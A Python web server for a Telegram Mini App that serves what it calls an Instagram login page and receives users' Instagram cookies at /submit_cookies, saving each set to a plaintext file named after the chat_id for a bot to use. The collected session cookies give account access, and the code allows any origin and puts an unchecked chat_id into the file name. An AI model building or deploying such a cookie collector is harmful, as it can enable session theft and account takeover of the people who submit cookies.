"""
Simple web server for Telegram Mini App.
Serves the Instagram login page and handles cookie submission.
"""

from http.server import HTTPServer, SimpleHTTPRequestHandler
import json
import os
import sys

class MiniAppHandler(SimpleHTTPRequestHandler):
    """Handler for Mini App requests."""
    
    def do_GET(self):
        """Serve the Mini App HTML."""
        if self.path == '/' or self.path == '/index.html':
            self.send_response(200)
            self.send_header('Content-type', 'text/html; charset=utf-8')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            
            with open('index.html', 'r', encoding='utf-8') as f:
                self.wfile.write(f.read().encode('utf-8'))
        else:
            super().do_GET()
    
    def do_POST(self):
        """Handle cookie submission from Mini App."""
        if self.path == '/submit_cookies':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            
            try:
                data = json.loads(post_data.decode('utf-8'))
                chat_id = data.get('chat_id')
                cookies = data.get('cookies')
                
                print(f"✅ Received cookies from chat_id: {chat_id}")
                print(f"🍪 Cookies count: {len(cookies)}")
                
                # Save cookies to file for bot to process
                cookies_file = f'cookies_{chat_id}.json'
                with open(cookies_file, 'w') as f:
                    json.dump(cookies, f, indent=2)
                
                self.send_response(200)
                self.send_header('Content-type', 'application/json')
                self.send_header('Access-Control-Allow-Origin', '*')
                self.end_headers()
                self.wfile.write(json.dumps({'success': True}).encode())
                
            except Exception as e:
                print(f"❌ Error processing cookies: {e}")
                self.send_response(500)
                self.send_header('Content-type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps({'success': False, 'error': str(e)}).encode())
        else:
            self.send_response(404)
            self.end_headers()


def run_server(port=8000):
    """Run the Mini App server."""
    os.chdir(os.path.dirname(os.path.abspath(__file__)))
    
    server_address = ('', port)
    httpd = HTTPServer(server_address, MiniAppHandler)
    
    print(f"🚀 Telegram Mini App server running on http://localhost:{port}")
    print(f"📱 Use this URL in @BotFather for your Mini App")
    print(f"⚠️  For production, use HTTPS (required by Telegram)")
    print(f"\nPress Ctrl+C to stop\n")
    
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("\n👋 Server stopped")
        httpd.shutdown()


if __name__ == '__main__':
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 8000
    run_server(port)

